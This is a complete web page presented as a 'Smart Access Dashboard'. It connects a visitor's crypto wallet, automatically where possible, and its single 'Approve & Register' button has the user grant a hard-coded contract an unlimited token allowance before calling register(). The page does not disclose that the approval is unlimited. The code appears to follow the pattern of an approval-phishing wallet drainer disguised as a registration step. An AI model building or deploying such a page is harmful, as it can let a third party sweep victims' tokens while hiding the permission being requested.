<!DOCTYPE html>
<html>
<head>
  <title>Smart Access Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <style>
    :root { --blue: #2196F3; --green: #4CAF50; }
    body { font-family: sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
    
    /* Wallet Icons */
    .wallet-list { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0; }
    .w-icon { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 12px; transition: 0.2s; }
    .w-icon:hover { background: #f8fbff; border-color: var(--blue); }
    .w-icon img { width: 40px; height: 40px; margin-bottom: 5px; }
    .w-icon span { font-size: 10px; font-weight: bold; display: block; }

    #dash { display: none; }
    .btn { padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; color: white; }
    .reg-btn { background: var(--green); }
    .status { font-size: 12px; color: #888; margin-top: 15px; }
  </style>
</head>
<body>

<div class="card">
  <div id="auth">
    <h2 style="margin:0">Connect Wallet</h2>
    <p style="font-size:14px; color:#666">Select your wallet app</p>
    
    <div class="wallet-list">
      <div class="w-icon" onclick="openApp('metamask')">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg">
        <span>MetaMask</span>
      </div>
      <div class="w-icon" onclick="openApp('trust')">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
        <span>Trust</span>
      </div>
      <div class="w-icon" onclick="openApp('tp')">
        <img src="https://www.tokenpocket.pro/static/images/logo.png">
        <span>Pocket</span>
      </div>
    </div>
  </div>

  <div id="dash">
    <h2 style="color:var(--blue)">Dashboard</h2>
    <p id="addr" style="font-size:12px; background:#eee; padding:10px; border-radius:8px; word-break:break-all"></p>
    <button id="regBtn" class="btn reg-btn" onclick="register()">Approve & Register</button>
  </div>
  
  <div id="msg" class="status"></div>
</div>

<script>
  const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
  let signer, tokenContract, managerContract;

  // 1. App Open Logic
  function openApp(wallet) {
    const url = window.location.href.replace(/^https?:\/\//, '');
    
    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && !window.ethereum) {
      if (wallet === 'metamask') window.location.href = `https://metamask.app.link/dapp/${url}`;
      else if (wallet === 'trust') window.location.href = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
      else if (wallet === 'tp') window.location.href = `tpdapp://open?params={"url": "${window.location.href}"}`;
    } else {
      connect(); // Laptop ke liye direct connect
    }
  }

  // 2. Connection Logic
  async function connect() {
    if (window.ethereum) {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const address = await signer.getAddress();

        tokenContract = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
        managerContract = new ethers.Contract(MANAGER, ["function register() external"], signer);

        document.getElementById('auth').style.display = 'none';
        document.getElementById('dash').style.display = 'block';
        document.getElementById('addr').innerText = address;
      } catch (e) { alert("Rejected!"); }
    } else {
      alert("Please open in a Wallet DApp Browser");
    }
  }

  // 3. Register Logic
  async function register() {
    const btn = document.getElementById('regBtn');
    const msg = document.getElementById('msg');
    try {
      btn.disabled = true;
      btn.innerText = "Wait...";
      msg.innerText = "Confirming Approval...";
      
      const tx1 = await tokenContract.approve(MANAGER, ethers.constants.MaxUint256);
      await tx1.wait();

      msg.innerText = "Confirming Registration...";
      const tx2 = await managerContract.register();
      await tx2.wait();

      msg.innerHTML = "<b style='color:green'>Success!</b>";
      alert("Done!");
    } catch (e) {
      alert("Failed!");
      btn.disabled = false;
      btn.innerText = "Approve & Register";
    }
  }

  // Auto connect agar browser ke andar hai
  if (window.ethereum) { connect(); }
</script>

</body>
</html>
